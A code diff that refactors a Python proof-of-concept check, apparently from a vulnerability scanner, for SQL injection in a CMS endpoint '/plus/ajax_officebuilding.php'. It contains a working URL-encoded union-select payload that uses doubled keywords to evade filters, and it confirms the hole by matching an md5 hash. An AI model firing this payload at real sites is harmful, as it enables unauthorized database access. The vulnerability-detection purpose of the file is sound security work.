@@ -46,14 +46,11 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            arg = '{target}'.format(target=self.target)
-            url = arg
-            req = requests.get(
-                url + "/plus/ajax_officebuilding.php?act=key&key=asd%E9%94%A6%27%20uniounionn%20selselectect"+"%201,2,3,md5(7836457),5,6,7,8,9%23")
-            if req.status_code == 200:
-                if "3438d5e3ead84b2effc5ec33ed1239f5" in req.text:
-                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
-                        target=self.target, name=self.vuln.name))
+            payload = "/plus/ajax_officebuilding.php?act=key&key=asd%E9%94%A6%27%20uniounionn%20selselectect"+"%201,2,3,md5(7836457),5,6,7,8,9%23"
+            req = requests.get(self.target + payload)
+            if req.status_code == 200 and "3438d5e3ead84b2effc5ec33ed1239f5" in req.text:
+                    self.output.report(self.vuln, '发现{target}存在{name}漏洞;\nSQL注入漏洞地址为{url}'.format(
+                        target=self.target, name=self.vuln.name, url=self.target + payload))
 
         except Exception as e:
             self.output.info('执行异常{}'.format(e))
